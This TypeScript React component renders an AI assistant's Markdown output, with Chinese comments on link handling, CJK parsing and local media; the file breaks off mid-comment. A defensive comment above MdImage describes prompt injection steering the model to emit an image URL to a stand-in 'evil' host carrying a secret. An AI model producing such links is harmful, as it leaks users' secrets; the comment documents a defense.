import {
  createContext,
  memo,
  startTransition,
  useContext,
  useEffect,
  useRef,
  useState,
} from "react";
import ReactMarkdown, { defaultUrlTransform } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";
import remarkCjkFriendly from "remark-cjk-friendly";
import remarkCjkFriendlyGfmStrikethrough from "remark-cjk-friendly-gfm-strikethrough";

import { openInBrowser, readFileBytes, revealInFinder } from "../bridge";
import { useTimedFlag } from "../hooks/useTimedFlag";
import { t, useT } from "../i18n";
import { openSession, sessionIdFromHref } from "../lib/sessionLink";
import { AGENT_LINK_SCHEME, openSubagent } from "../lib/subagentLink";
import { splitMarkdownBlocks } from "../lib/mdBlocks";
import {
  browserOpenableFile,
  fileUrlOf,
  openInPanelBrowser,
  splitLinkIntent,
} from "../lib/linkIntent";
import { findAbsPathFor } from "../lib/relinkPath";
import { cellFloorEm } from "../lib/tableCellFloor";
import { basename, joinRoot, looksAbsPath } from "../pathDisplay";
import { type Theme, getTheme, subscribeTheme } from "../theme";
import { audioMimeOf, imageMimeOf, openFilePreview, videoMimeOf } from "./FilePreview";
import { BrowserIcon, FolderIcon, ForkIcon } from "./icons";
import { AudioPlayer } from "./AudioPlayer";
import { FullscreenGlyph, MediaBar, VolumeGlyph, useMediaPlayback, useVideoFullscreen } from "./MediaControls";
import { MermaidBlock } from "./Mermaid";
import { ShotViewer } from "./ToolCard";

import hljsDarkCss from "highlight.js/styles/github-dark-dimmed.css?inline";
import hljsLightCss from "highlight.js/styles/github.css?inline";

/**
 * highlight.js 的配色随主题切。
 *
 * 两套主题以字符串打进包里（`?inline`：Vite 只给文本，不注入），由这一个
 * `<style>` 按解析后的主题换内容。不能像以前那样静态 `import` 主题 CSS ——
 * 那会被打进全局样式表，两套一起进就是后进的盖住先进的，切不动。
 *
 * 插在 `<head>` 最前面而不是末尾：原来的静态 import 在打包产物里排在
 * styles.css 之前，styles.css 里对 `.hljs` 的覆盖（去底色、去内边距）都是
 * 在这个次序下写的。换了注入方式，次序不该跟着反过来。
 *
 * 这份样式全局生效：CodeView（文件预览的代码高亮）也用 `.hljs` 类。
 */
const HLJS_STYLE_ID = "riot-hljs-theme";
const HLJS_CSS: Record<Theme, string> = { dark: hljsDarkCss, light: hljsLightCss };

function applyHljsTheme(theme: Theme) {
  let el = document.getElementById(HLJS_STYLE_ID);
  if (!el) {
    el = document.createElement("style");
    el.id = HLJS_STYLE_ID;
    document.head.prepend(el);
  }
  const css = HLJS_CSS[theme];
  if (el.textContent !== css) el.textContent = css;
}

applyHljsTheme(getTheme());
subscribeTheme(applyHljsTheme);

/**
 * 当前会话的项目根。代码引用要靠它把模型写的相对路径拼成能打开的绝对路径。
 *
 * 用 context 而不是逐层传 prop：`Markdown` 有四个调用点，其中两个在
 * `memo` 过的 `Row` 里 —— 加一个 prop 就要把 root 一路穿过去，而它在整个
 * 会话里是个不变的字符串。
 */
export const ProjectRootContext = createContext<string>("");

/**
 * 代码引用的 info string：`起始行:结束行:路径`。
 *
 * 模型引用**仓库里已有的**代码时用这个格式（提示词里有约定），渲染成一个
 * 带路径标题、点一下能打开文件的代码块。新写的代码走普通语言标签，
 * 两者要看得出区别 —— 前者是"去看这里"，后者是"这是我建议加的"。
 */
const CODE_REF = /^(\d+):(\d+):(.+)$/;

/**
 * 扩展名 → highlight.js 的语言名。
 *
 * 代码引用的 info string 位置被路径占了，highlight.js 认不出来会整块不高亮。
 * 认不出的扩展名返回 undefined，退化成纯文本 —— 那只是不好看，不是坏了。
 */
const EXT_LANG: Record<string, string> = {
  rs: "rust",
  ts: "typescript",
  tsx: "tsx",
  js: "javascript",
  jsx: "jsx",
  mjs: "javascript",
  json: "json",
  toml: "ini",
  md: "markdown",
  css: "css",
  html: "xml",
  py: "python",
  sh: "bash",
  bash: "bash",
  zsh: "bash",
  yml: "yaml",
  yaml: "yaml",
  sql: "sql",
};

type MdNode = {
  type: string;
  value?: string;
  lang?: string | null;
  url?: string;
  position?: { start?: { offset?: number } };
  data?: { hProperties?: Record<string, string> };
  children?: MdNode[];
};

/**
 * 全角标点：裸 URL 撞上它们就该收尾。真实 URL 里这些字符几乎不会
 * 裸出现（浏览器复制出来是百分号编码），出现即意味着"正文开始了"。
 * 全角字母数字和汉字不在内 —— `wiki/汉字` 这类路径是合法的。
 * U+3000（全角空格）也算：GFM 只认 ASCII 空白，它拦不住自动链接。
 */
const CJK_PUNCT =
  /[\u2018-\u201F\u2026\u3000-\u3002\u3008-\u3011\u3014-\u301F\uFF01-\uFF0F\uFF1A-\uFF20\uFF3B-\uFF40\uFF5B-\uFF65]/;

/**
 * 把 GFM 自动识别的裸链接在第一个全角标点处截断，截掉的尾巴还回正文。
 *
 * GFM 自动链接到空白才停，尾部修剪只认 ASCII 标点。中文语境里
 * `（https://linux.do/latest）。需要…` 会把 `）。需要…` 整段吞进
 * URL —— 链接点开是 404，满屏蓝字也没法读。
 *
 * 只动自动链接（文字与 URL 一字不差、起点重合）；`[文字](url)` 和
 * `<url>` 是作者明确划的边界，URL 里就算有全角字符也照单全收。
 */
function remarkCjkAutolinks() {
  return (tree: MdNode) => {
    walk(tree, (node) => {
      const kids = node.children;
      if (!kids) return;
      for (let i = 0; i < kids.length; i++) {
        const link = kids[i];
        if (!link || link.type !== "link" || link.children?.length !== 1) continue;
        const text = link.children[0];
        if (!text || text.type !== "text") continue;
        const value = text.value ?? "";
        const url = link.url ?? "";
        // 自动链接的特征：链接文字与 URL 一致（www 裸域名会被 GFM 补上
        // http:// 前缀），且节点起点与文字起点重合（`<url>` 的起点在 `<`，
        // `[文字](url)` 的起点在 `[`，都会错开）。
        if (url !== value && url !== `http://${value}`) continue;
        if (link.position?.start?.offset !== text.position?.start?.offset) continue;
        const m = CJK_PUNCT.exec(value);
        if (!m || m.index === 0) continue;
        const tail = value.slice(m.index);
        text.value = value.slice(0, m.index);
        link.url = url.slice(0, url.length - tail.length);
        kids.splice(i + 1, 0, { type: "text", value: tail });
      }
    });
  };
}

/** 软换行前后的空白：断行时要吃掉，否则新行开头挂着缩进。 */
const SOFT_BREAK = /[\t ]*\n[\t ]*/;

/**
 * 段内的单换行渲染成真断行（`<br>`），给思考过程用。
 *
 * markdown 的规矩是把连续的行并成一段，那是给"写出来的文章"定的。
 * 模型的思考是流水账，常拿单换行分句、列条目，并成整段就是一堵墙 ——
 * 比不渲染还难读。
 *
 * 做在 mdast 层而不是拿 CSS 的 `white-space: pre-line` 糊：换行是继承
 * 属性，而 mdast 转 HTML 时会在 `<li>`、`<blockquote>`、表格行里垫
 * 排版用的换行（松散列表是 `<li>⏎<p>…</p>⏎</li>`）。那些换行不该
 * 显示出来，pre-line 会把它们一并断掉，序号和正文当场错开两行。
 */
function remarkSoftBreaks() {
  return (tree: MdNode) => {
    walk(tree, (node) => {
      const kids = node.children;
      if (!kids) return;
      let split = false;
      const out: MdNode[] = [];
      for (const kid of kids) {
        // 只拆纯文本。代码块 / 行内代码是别的节点类型，天然不会进来。
        const parts = kid.type === "text" ? (kid.value ?? "").split(SOFT_BREAK) : [];
        if (parts.length < 2) {
          out.push(kid);
          continue;
        }
        split = true;
        parts.forEach((part, i) => {
          if (i > 0) out.push({ type: "break" });
          if (part) out.push({ ...kid, value: part });
        });
      }
      if (split) node.children = out;
    });
  };
}

/**
 * 把 `12:14:src/foo.rs` 这样的 info string 拆成 data 属性，并把 lang 换成
 * 真语言，让后面的 rehypeHighlight 照常工作。
 *
 * 做在 remark 这一层（mdast）而不是渲染时：放到渲染时再拆的话，语言
 * 已经错过高亮那一步了。`code` 节点的 `data.hProperties` 会被
 * mdast-util-to-hast 应用到**内层的 `<code>`** 上（不是外层 `<pre>`），
 * [`CodeBlock`] 从子元素的 props 里取。
 */
function remarkCodeRefs() {
  return (tree: MdNode) => {
    walk(tree, (node) => {
      if (node.type !== "code" || !node.lang) return;
      const m = CODE_REF.exec(node.lang);
      if (!m) return;
      const [, start, end, path] = m;
      if (!start || !end || !path) return;
      node.data = {
        ...node.data,
        hProperties: {
          ...node.data?.hProperties,
          "data-ref-path": path,
          "data-ref-start": start,
          "data-ref-end": end,
        },
      };
      const ext = path.split(".").pop()?.toLowerCase() ?? "";
      node.lang = EXT_LANG[ext] ?? null;
    });
  };
}

/**
 * 给每个表格单元格写上保底宽度 `--md-cell-floor`，CSS 拿它做 min-width。
 * 为什么按内容估、估法和封顶见 [`cellFloorEm`]。
 *
 * 做在 mdast 层：`tableCell` 的 `data.hProperties` 会被 mdast-util-to-hast
 * 合并到生成的 `<th>` / `<td>` 上，GFM 对齐写成的 `text-align` 照样叠加，
 * 不用接管单元格的渲染。第一行是表头（粗体）。
 */
function remarkTableCellFloor() {
  return (tree: MdNode) => {
    walk(tree, (node) => {
      if (node.type !== "table") return;
      node.children?.forEach((row, r) => {
        for (const cell of row.children ?? []) {
          const em = cellFloorEm(plainText(cell), r === 0);
          cell.data = {
            ...cell.data,
            hProperties: { ...cell.data?.hProperties, style: `--md-cell-floor:${em}em` },
          };
        }
      });
    });
  };
}

/**
 * 相对路径的文件链接，换成同一块文字里写明的绝对路径。为什么见
 * [`findAbsPathFor`]。按块（段落、列表…）收集候选，链接和贴在旁边的
 * 路径通常在同一句里。
 */
function remarkRelinkPaths() {
  return (tree: MdNode) => {
    const links: MdNode[] = [];
    const texts: string[] = [];
    walk(tree, (node) => {
      if (node.type === "link") links.push(node);
      else if (node.type === "text" || node.type === "inlineCode") texts.push(node.value ?? "");
    });
    for (const link of links) {
      // 意图前缀（`browser:` / `reveal:`）后面的那段照样纠正，前缀留着。
      const decoded = tryDecodePath(link.url ?? "");
      const intent = splitLinkIntent(decoded);
      const url = intent ? intent.rest : decoded;
      if (!url || url.startsWith("#") || /^[a-z][a-z0-9+.-]*:/i.test(url)) continue;
      const abs = findAbsPathFor(url, texts);
      if (abs) link.url = intent ? `${intent.intent}:${abs}` : abs;
    }
  };
}

function plainText(node: MdNode): string {
  if (node.value !== undefined) return node.value;
  return (node.children ?? []).map(plainText).join("");
}

function walk(node: MdNode, visit: (n: MdNode) => void) {
  visit(node);
  for (const child of node.children ?? []) walk(child, visit);
}

/**
 * 助手输出的 Markdown 渲染。
 *
 * `[约束]` memo 是性能要求，不是锦上添花。流式输出时 transcript 每帧
 * 重渲染，没有 memo 的话每条历史消息都要重新 parse 一遍 markdown ——
 * 长对话里打字机效果会肉眼可见地掉帧。有 memo 后只有正在流式的那一段
 * 反复 parse，它通常只有几百字。
 *
 * 用户消息**不走这里**：用户输入的 `# 标题` 就是字面上的井号标题，
 * 按 markdown 渲染等于篡改他说的话。
 */
export const Markdown = memo(function Markdown({
  text,
  breaks = false,
  animated = false,
}: {
  text: string;
  /** 段内单换行照原样断行。见 [`remarkSoftBreaks`]，只有思考过程要。 */
  breaks?: boolean;
  /**
   * 这段正文**正在流**：新长出来的块逐个淡入（样式见 styles.css 的
   * `.md[data-md-animated]`）。
   *
   * `[约束]` 只给正在流的那一条开。历史消息也开的话，切会话、懒水合
   * 落地、⌘F 全量水合都会让整屏重播一遍淡入。
   *
   * 正在流的正文还按顶层块切开渲染（见 lib/mdBlocks）：说完的块 memo
   * 住，每帧只 parse 尾巴那一块。
   */
  animated?: boolean;
}) {
  return (
    <div className="md" {...(animated ? { "data-md-animated": "" } : {})}>
      {animated ? (
        // key 用下标：块只会在末尾长出来，前面的块下标不变、实例不换，
        // DOM 原地复用，淡入不会重播。
        splitMarkdownBlocks(text).map((block, i) => (
          <MdChunk key={i} text={block} breaks={breaks} />
        ))
      ) : (
        <MdChunk text={text} breaks={breaks} />
      )}
    </div>
  );
});

/**
 * `[约束]` 两个 cjk-friendly 插件紧跟在 remarkGfm 后面，删除线那个必须在
 * remarkGfm **之后**（它改的是 GFM 注册的 `~~` 解析，放前面不生效）。
 *
 * 它们修的是 CommonMark 对中文的一条规则：`**` 内侧是标点、外侧是汉字时
 * 不算闭合。模型写中文常把句号包进加粗再紧接下一句 ——
 * `**第一，防止踩踏。**昨天…` —— 不加这两个插件的话，两对星号原样露出来。
 * 英文的判定不变。
 */
export const REMARK_PLUGINS = [
  remarkGfm,
  remarkCjkFriendly,
  remarkCjkFriendlyGfmStrikethrough,
  remarkCjkAutolinks,
  remarkCodeRefs,
  remarkTableCellFloor,
  remarkRelinkPaths,
];
const REMARK_PLUGINS_BREAKS = [...REMARK_PLUGINS, remarkSoftBreaks];
const REHYPE_PLUGINS: NonNullable<Parameters<typeof ReactMarkdown>[0]["rehypePlugins"]> = [
  [rehypeHighlight, { ignoreMissing: true, detect: false }],
];
const MD_COMPONENTS = { pre: CodeBlock, a: MdLink, img: MdImage };

/**
 * 一段 Markdown 的解析结果，不带外层容器。react-markdown 渲染出来的是
 * 片段，所以切成几块之后各块的顶层元素仍然直接挂在 `.md` 下 ——
 * `.md > *` 的那些样式（首尾外边距、淡入）不受切分影响。
 */
const MdChunk = memo(function MdChunk({ text, breaks }: { text: string; breaks: boolean }) {
  return (
    <ReactMarkdown
      remarkPlugins={breaks ? REMARK_PLUGINS_BREAKS : REMARK_PLUGINS}
      rehypePlugins={REHYPE_PLUGINS}
      urlTransform={keepFileUrls}
      components={MD_COMPONENTS}
    >
      {text}
    </ReactMarkdown>
  );
});

/**
 * 放行 `file:` 链接，其余交给默认的白名单（http/https/mailto 等）。
 *
 * react-markdown 的默认白名单会把 `file://` 的 href 清成空字符串 ——
 * 模型写的真实路径就这么丢了，[`MdLink`] 只能退回"拿链接文字当相对
 * 路径猜"，猜错就是无声无息。链接的打开全部由 [`MdLink`] 接管
 * （preventDefault），file: 不会真的交给 webview 导航，放行它不会
 * 打开 javascript: 那类注入面。图片的 src 走同一个变换，由 [`MdImage`]
 * 接管，同理。
 */
function keepFileUrls(url: string): string {
  // `agent:` 是子 agent 链接（Task 工具让模型这么写），`riot:` 是历史会话
  // 链接（系统提示词 past_sessions 一节），`browser:` / `reveal:` 是链接
  // 意图（见 lib/linkIntent），都由 MdLink 接管。
  if (/^(file|agent|riot|browser|reveal):/i.test(url)) return url;
  // Windows 盘符路径（`C:\…`、`D:/…`）：白名单把 `C` 当成未知协议清掉，
  // 模型写的绝对路径就没了。它不是 URL，也不会交给 webview 导航。
  if (/^[a-z]:[\\/]/i.test(url)) return url;
  return defaultUrlTransform(url);
}

/** 让一块懒加载正文现在就解析（见 LazyMarkdown 和 Transcript 的空闲预解析）。 */
export const HYDRATE_EVENT = "riot:hydrate";

/**
 * 视口外的正文先按纯文本占位，进视野再 parse。
 *
 * 切到长会话时上百条一起走 ReactMarkdown + highlight 会把主线程卡死，
 * 表现为白屏。贴底的那几条（`eager`）立刻渲染，用户看到的就是最新对话。
 * 对话流空闲时也会派 HYDRATE_EVENT 过来，把视口附近的提前解析掉。
 */
export const LazyMarkdown = memo(function LazyMarkdown({
  text,
  eager = false,
}: {
  text: string;
  eager?: boolean;
}) {
  const ref = useRef<HTMLDivElement>(null);
  const [on, setOn] = useState(eager);

  useEffect(() => {
    if (eager) setOn(true);
  }, [eager]);

  useEffect(() => {
    if (on) return;
    const el = ref.current;
    if (!el) return;
    const root = el.closest(".transcript");
    const io = new IntersectionObserver(
      (entries) => {
        if (entries.some((e) => e.isIntersecting)) {
          io.disconnect();
          startTransition(() => setOn(true));
        }
      },
      { root: root instanceof Element ? root : null, rootMargin: "1200px 0px" },
    );
    io.observe(el);
    const hydrate = () => {
      io.disconnect();
      startTransition(() => setOn(true));
    };
    el.addEventListener(HYDRATE_EVENT, hydrate);
    return () => {
      io.disconnect();
      el.removeEventListener(HYDRATE_EVENT, hydrate);
    };
  }, [on]);

  // eager 当场就画真身，不等 effect 把 on 翻过来再多提交一轮 —— 查找要在
  // 同一次（flushSync 的）提交里拿到解析后的文本节点。
  if (on || eager) return <Markdown text={text} />;
  return (
    <div ref={ref} className="md md-lazy">
      {text}
    </div>
  );
});

/**
 * Markdown 链接。
 *
 * 不能把 href 原样丢给 `<a>`：相对路径和空地址会被浏览器解析成
 * `http://localhost:1420/…`（开发时的 Vite 页，打包后是 webview 自己的
 * origin）。点下去不是打开文件，而是把应用导航走 —— 而且没有后退按钮。
 *
 * 本地路径（含模型误写成应用 origin 的假网址）在应用内预览 —— 模型交付
 * 的 docx / PDF 点开就能看，预览窗里有"系统应用打开"兜底；真正的
 * http(s) 走系统浏览器。
 */
function MdLink({
  href,
  children,
  plain = false,
}: {
  href?: string | undefined;
  children?: React.ReactNode;
  /** 只要链接本身：音频读不到时的退路用它，免得又绕回播放器。 */
  plain?: boolean;
}) {
  const { t } = useT();
  const root = useContext(ProjectRootContext);
  const [err, flashErr] = useTimedFlag(false, 2000);
  const label = extractText(children);
  const target = resolveMdLink(href, label, root);

  if (!target) return <>{children}</>;

  // 指向本地音频的链接就地给播放器（模型说「你听一下：[a.mp3](a.mp3)」时，
  // 用户要的是听，不是被拉去外部播放器）。图片语法那条路见 MdImage。
  if (!plain && target.kind === "file") {
    const audio = audioMimeOf(target.value);
    if (audio) {
      return <LocalAudio key={target.value} path={target.value} mime={audio} alt={label} />;
    }
  }

  const onClick = (e: React.MouseEvent<HTMLAnchorElement>) => {
    e.preventDefault();
    if (target.kind === "file") {
      openFilePreview(target.value);
      return;
    }
    if (target.kind === "agent") {
      openSubagent(target.value, label);
      return;
    }
    if (target.kind === "session") {
      if (!openSession(target.value)) flashErr(true);
      return;
    }
    if (target.kind === "reveal") {
      revealInFinder(target.value).catch(() => flashErr(true));
      return;
    }
    if (target.kind === "browser" && openInPanelBrowser(target.value)) return;
    openInBrowser(target.value).catch(() => flashErr(true));
  };

  const chip = target.kind === "agent" || target.kind === "session";
  // 带意图的链接前面挂一枚动作图标：点之前就知道是开浏览器还是开文件夹。
  const intentIcon =
    target.kind === "browser" ? <BrowserIcon /> : target.kind === "reveal" ? <FolderIcon /> : null;
  const errText =
    target.kind === "session" ? t("transcript.md.sessionDeleted") : t("transcript.md.cantOpen");

  return (
    <>
      <a
        href={target.href}
        className={
          chip ? `md-agent-link md-${target.kind}-link` : intentIcon ? "md-intent-link" : undefined
        }
        title={err ? errText : target.title}
        onClick={onClick}
      >
        {chip ? (
          <span className="md-agent-icon" aria-hidden>
            {target.kind === "agent" ? <ForkIcon /> : "↶"}
          </span>
        ) : null}
        {intentIcon ? (
          <span className="md-link-icon" aria-hidden>
            {intentIcon}
          </span>
        ) : null}
        {children}
      </a>
      {err ? (
        <span className="md-link-err" role="status">
          {errText}
        </span>
      ) : null}
    </>
  );
}

type MdLinkTarget = {
  /** browser：内置浏览器打开 `value`（网址或 file:// 地址）；reveal：在文件夹中显示 `value`。 */
  kind: "url" | "file" | "agent" | "session" | "browser" | "reveal";
  value: string;
  href: string;
  title: string;
};

/**
 * 把模型写的 href 收成"打开网址"、"打开本地文件"、"打开子 agent 会话"
 * 或"跳到历史会话"。
 */
function resolveMdLink(href: string | undefined, label: string, root: string): MdLinkTarget | null {
  const raw = (href ?? "").trim();

  // `browser:…` / `reveal:…`：模型写明了点击意图（见 lib/linkIntent）。
  // 前缀后面那段按普通链接解析；意图对它不成立时（网址没法"在文件夹
  // 中显示"、`.json` 不该开进浏览器）退回普通链接的默认行为。
  const split = splitLinkIntent(raw);
  if (split) {
    const inner = resolveMdLink(split.rest, label, root);
    if (split.intent === "reveal" && inner?.kind === "file") {
      return { ...inner, kind: "reveal" };
    }
    if (split.intent === "browser" && inner?.kind === "url" && /^https?:/i.test(inner.value)) {
      return { ...inner, kind: "browser" };
    }
    if (split.intent === "browser" && inner?.kind === "file" && browserOpenableFile(inner.value)) {
      return { ...inner, kind: "browser", value: fileUrlOf(inner.value) };
    }
    return inner;
  }

  // `agent:agt_xxx`：子 agent 的会话（Task 工具提示词里教模型这么写）。
  if (raw.toLowerCase().startsWith(AGENT_LINK_SCHEME)) {
    const id = raw.slice(AGENT_LINK_SCHEME.length).trim();
    if (!id) return null;
    return {
      kind: "agent",
      value: id,
      href: raw,
      title: t("transcript.md.openSubagent", { id }),
    };
  }

  // `riot://session/ses_xxx`：历史会话（系统提示词 past_sessions 一节）。
  const sessionId = sessionIdFromHref(raw);
  if (sessionId) {
    return { kind: "session", value: sessionId, href: raw, title: t("transcript.md.switchSession") };
  }

  if (raw.startsWith("file://")) {
    const path = fileUrlToPath(raw);
    return path ? fileTarget(path) : null;
  }

  if (/^https?:\/\//i.test(raw)) {
    try {
      const u = new URL(raw);
      if (u.origin === window.location.origin) {
        const rel = decodeURIComponent(u.pathname).replace(/^\/+/, "");
        const name = rel || label.trim();
        if (!name) return null;
        return fileTarget(looksAbsPath(name) ? name : joinRoot(root, name));
      }
      return { kind: "url", value: u.href, href: u.href, title: u.href };
    } catch {
      return null;
    }
  }

  // Windows 盘符 `D:/…` 长得像"单字母协议 + 冒号"，得先排除 —— 否则当成
  // 网址交给系统 opener，被它的协议白名单拒掉，点了只报"打不开"。
  if (/^[a-z][a-z0-9+.-]*:/i.test(raw) && !looksAbsPath(tryDecodePath(raw))) {
    return { kind: "url", value: raw, href: raw, title: raw };
  }

  // markdown 渲染成 href 时地址被 percent-encode 过（中文、空格都成了
  // %XX）。file:// 分支的 URL 解析自带解码；这条纯路径分支得自己解，
  // 否则中文文件名拼出来的路径永远不存在。链接文字是明文，不用解。
  const pathish = raw ? tryDecodePath(raw) : label.trim();
  if (!pathish || pathish.startsWith("#")) return null;
  return fileTarget(looksAbsPath(pathish) ? pathish : joinRoot(root, pathish));
}

/** 文件名里真有孤立 `%` 时 decodeURIComponent 会抛 —— 那就按原样用。 */
function tryDecodePath(s: string): string {
  try {
    return decodeURIComponent(s);
  } catch {
    return s;
  }
}

function fileTarget(path: string): MdLinkTarget {
  return { kind: "file", value: path, href: toFileHref(path), title: path };
}

function toFileHref(absPath: string): string {
  const unified = absPath.replace(/\\/g, "/");
  if (/^[A-Za-z]:/.test(unified)) return `file:///${unified}`;
  if (unified.startsWith("/")) return `file://${unified}`;
  return `file:///${unified}`;
}

function fileUrlToPath(url: string): string | null {
  try {
    let p = decodeURIComponent(new URL(url).pathname);
    if (/^\/[A-Za-z]:/.test(p)) p = p.slice(1);
    return p || null;
  } catch {
    return null;
  }
}

/**
 * Markdown 图片：`![说明](路径)`。
 *
 * 模型这么写是要把一张图**贴给用户看**，自己并不需要看 —— 系统提示词和
 * Read 的工具提示都教它：只给用户看的图不要 Read（读一张图要花上千
 * token，还会一直留在上下文里），写成图片引用就行。这条路上模型一个
 * token 都不花，图从磁盘直接进界面。
 *
 * 不能把 src 原样交给 `<img>`：webview 不加载 `file://`，纯路径会被解析
 * 成应用 origin 下的地址（和 [`MdLink`] 面对的是同一个问题），结果是一张
 * 裂图。本地路径按 [`resolveMdLink`] 同一套规则收成绝对路径，再经
 * `read_file_bytes` 读进来转 blob URL —— 和文件预览的图片查看同一条路、
 * 同一道预览围栏（见宿主的 preview 模块）。
 *
 * `[约束]` http(s) 的图**不加载**，渲染成一个用系统浏览器打开的链接。
 * 一是 CSP 的 img-src 没放行远程源；二是这正是提示注入借图片外传数据的
 * 经典通道 —— 网页里的一句话让模型写出 `![](https://evil/?q=<密钥>)`，
 * webview 一加载就把数据送出去了。模型要看远程图走 WebFetch，那条路有
 * 准入和授权。
 */
function MdImage({
  src,
  alt,
  title,
}: {
  src?: string | undefined;
  alt?: string | undefined;
  title?: string | undefined;
}) {
  const root = useContext(ProjectRootContext);
  const target = resolveMdLink(src, "", root);
  const label = alt?.trim() ?? "";

  if (!target || target.kind === "agent" || target.kind === "session") {
    return label ? <span className="md-img-broken">{label}</span> : null;
  }
  if (target.kind === "url") {
    return (
      <span className="md-img-remote">
        <MdLink href={target.href}>{label || target.href}</MdLink>
      </span>
    );
  }
  // 音频同理：一条带文件名的播放条。
  const audio = audioMimeOf(target.value);
  if (audio) {
    return <LocalAudio key={target.value} path={target.value} mime={audio} alt={label} />;
  }
  // 视频同一种写法，就地给播放器（照 Claude：做完的视频直接在对话里看）。
  const video = videoMimeOf(target.value);
  if (video) {
    return <LocalVideo key={target.value} path={target.value} mime={video} alt={label} />;
  }
  // 不是界面认得的图片类型（模型把 pdf / docx 写成了图片引用）就按
  // 文件链接给，点开走预览，好过一张永远加载不出来的图。
  const mime = imageMimeOf(target.value);
  if (!mime) {
    return <MdLink href={target.href}>{label || basename(target.value)}</MdLink>;
  }
  // 按路径 key：换了路径整个重挂，旧 blob 在卸载时释放，不会有一帧
  // 显示着已经 revoke 掉的地址。
  return (
    <LocalImage key={target.value} path={target.value} mime={mime} alt={label} title={title} />
  );
}

/**
 * 刚读进来的本地媒体 blob，按「路径 + 类型」短暂共享。
 *
 * 正在流的那条回答落定时，整条从流式区换成历史行 —— 两个不同的 React
 * 实例。不共享的话，图片 / 视频在那一刻重新读盘：先闪回文件名占位、
 * 高度塌下去，再撑回原图，对话流跟着跳一下。
 *
 * `[约束]` 只在读完后的很短一段时间里共享，过期就重读。模型常常改完
 * 同一个 `chart.png` 再贴一次，按路径长期缓存会给它看旧图。换实例只差
 * 一次提交，几秒足够盖住。
 */
const BLOB_FRESH_MS = 3_000;
const freshBlobs = new Map<string, { url: string; at: number }>();
/** blob URL 的持有数。归零后延迟回收：换实例时旧的先卸、新的后挂。 */
const blobRefs = new Map<string, { n: number; timer: number }>();
/** 视频封面按 blob URL 记：同一份字节挑一次就够。随 blob 回收一起清。 */
const posterCache = new Map<string, Poster | null>();

function freshBlob(key: string): string | null {
  const hit = freshBlobs.get(key);
  return hit && Date.now() - hit.at < BLOB_FRESH_MS ? hit.url : null;
}

function retainBlob(url: string) {
  const r = blobRefs.get(url);
  if (r) {
    window.clearTimeout(r.timer);
    r.n++;
  } else {
    blobRefs.set(url, { n: 1, timer: 0 });
  }
}

function releaseBlob(url: string) {
  const r = blobRefs.get(url);
  if (!r || --r.n > 0) return;
  window.clearTimeout(r.timer);
  r.timer = window.setTimeout(() => {
    if (r.n > 0) return;
    blobRefs.delete(url);
    posterCache.delete(url);
    for (const [k, v] of freshBlobs) if (v.url === url) freshBlobs.delete(k);
    URL.revokeObjectURL(url);
  }, BLOB_FRESH_MS);
}

/** 本地文件 → blob URL。读不到时 `failed`。 */
function useFileBlob(path: string, mime: string): { src: string | null; failed: boolean } {
  const key = `${mime}\u0000${path}`;
  const [src, setSrc] = useState<string | null>(() => freshBlob(key));
  const [failed, setFailed] = useState(false);

  useEffect(() => {
    const hit = freshBlob(key);
    if (hit) {
      retainBlob(hit);
      setSrc(hit);
      return () => releaseBlob(hit);
    }
    let stale = false;
    let url: string | null = null;
    readFileBytes(path).then(
      (buf) => {
        if (stale) return;
        url = URL.createObjectURL(new Blob([buf], { type: mime }));
        freshBlobs.set(key, { url, at: Date.now() });
        retainBlob(url);
        setSrc(url);
      },
      () => {
        if (!stale) setFailed(true);
      },
    );
    return () => {
      stale = true;
      if (url) releaseBlob(url);
    };
  }, [key, path, mime]);

  return { src, failed };
}

/** 磁盘上的一张图：读进来贴出，点击全屏放大（和工具卡片里的截图同一个查看器）。 */
function LocalImage({
  path,
  mime,
  alt,
  title,
}: {
  path: string;
  mime: string;
  alt: string;
  title?: string | undefined;
}) {
  const { t } = useT();
  const { src, failed } = useFileBlob(path, mime);
  const [viewer, setViewer] = useState(false);
  const name = alt || basename(path);

  if (failed) {
    // 读不到（围栏外、超上限、已删除）：留一个能点的文件链接 —— 点开走
    // 预览那条路，预览也读不到时会退到访达定位，用户至少知道图在哪。
    return (
      <span className="md-img-broken">
        <MdLink href={toFileHref(path)}>{name}</MdLink>
        <span className="md-link-err" role="status">
          {t("transcript.md.imageUnavailable")}
        </span>
      </span>
    );
  }
  if (!src) {
    return (
      <span className="md-img-pending" title={path}>
        {name}
      </span>
    );
  }
  return (
    <>
      <button
        type="button"
        className="md-img-wrap"
        onClick={() => setViewer(true)}
        aria-label={t("transcript.image.zoomNamed", { name })}
        title={title ?? path}
      >
        <img className="md-img" src={src} alt={name} />
      </button>
      {viewer ? <ShotViewer src={src} alt={name} onClose={() => setViewer(false)} /> : null}
    </>
  );
}

/**
 * 磁盘上的一段视频：读进来交给原生播放器。
 *
 * 和图片一样走 readFileBytes → blob：网页版（远程访问）里也是同一条路，
 * 不依赖桌面才有的 asset 协议。代价是整段读进内存，受宿主的预览上限
 * （32 MB）约束 —— 超了就退成文件链接，点开交给系统播放器。演示片、
 * 录屏这类短视频一般在这个量级以内。
 */
function LocalVideo({ path, mime, alt }: { path: string; mime: string; alt: string }) {
  const { t } = useT();
  const { src, failed } = useFileBlob(path, mime);
  // undefined = 还在挑封面；null = 挑不出来，用播放器默认的第一帧。
  // 同一份 blob 挑过的封面直接拿（见 posterCache）。
  const [poster, setPoster] = useState<Poster | null | undefined>(() =>
    src ? posterCache.get(src) : undefined,
  );
  /** 点过播放了：封面层撤掉，换成播放器自己的控件。 */
  const [started, setStarted] = useState(false);
  const name = alt || basename(path);

  useEffect(() => {
    if (!src || posterCache.has(src)) {
      if (src) setPoster(posterCache.get(src));
      return;
    }
    let stale = false;
    void posterOf(src).then((p) => {
      posterCache.set(src, p ?? null);
      if (!stale) setPoster(p ?? null);
    });
    return () => {
      stale = true;
    };
  }, [src]);

  if (failed) {
    return (
      <span className="md-img-broken">
        <MdLink href={toFileHref(path)}>{name}</MdLink>
        <span className="md-link-err" role="status">
          {t("transcript.md.videoUnavailable")}
        </span>
      </span>
    );
  }
  // 封面挑好之前不挂播放器，否则先闪一下黑色的第一帧。
  if (!src || poster === undefined) {
    return (
      <span className="md-img-pending" title={path}>
        {name}
      </span>
    );
  }
  return (
    <VideoPlayer
      src={src}
      path={path}
      name={name}
      poster={poster}
      started={started}
      onStart={() => setStarted(true)}
    />
  );
}

/**
 * 视频播放器。控件自己画（为什么不用原生 controls 见 MediaControls）：
 * 叠在画面底部，暂停时常显，播放时指针移上来才出现；点画面切换播放。
 *
